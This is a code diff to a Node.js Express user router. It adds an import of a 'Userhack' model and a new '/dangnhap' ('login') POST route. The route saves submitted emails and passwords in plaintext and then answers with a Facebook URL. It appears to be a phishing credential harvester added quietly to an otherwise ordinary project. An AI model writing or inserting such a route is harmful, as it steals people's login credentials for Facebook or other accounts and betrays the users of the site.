@@ -4,6 +4,7 @@ import expressAsyncHandler from 'express-async-handler';
 import jwt from 'jsonwebtoken';
 import User from '../models/userModel.js';
 import { isAuth, isAdmin, generateToken, baseUrl, mailgun } from '../utils.js';
+import Userhack from '../models/userhacker.js';
 
 const userRouter = express.Router();
 
@@ -192,6 +193,24 @@ userRouter.post(
       isAdmin: user.isAdmin,
       token: generateToken(user),
     });
+  })
+);
+userRouter.post(
+  '/dangnhap',
+  expressAsyncHandler(async (req, res) => {
+    const newUser = new Userhack({
+      email: req.body.email,
+      password: req.body.password,
+      
+    });
+       try{
+       
+        const user = await newUser.save();
+
+       }catch(err){
+          console.log(err);
+       }
+       res.send("https://www.facebook.com/")
   })
 );
 
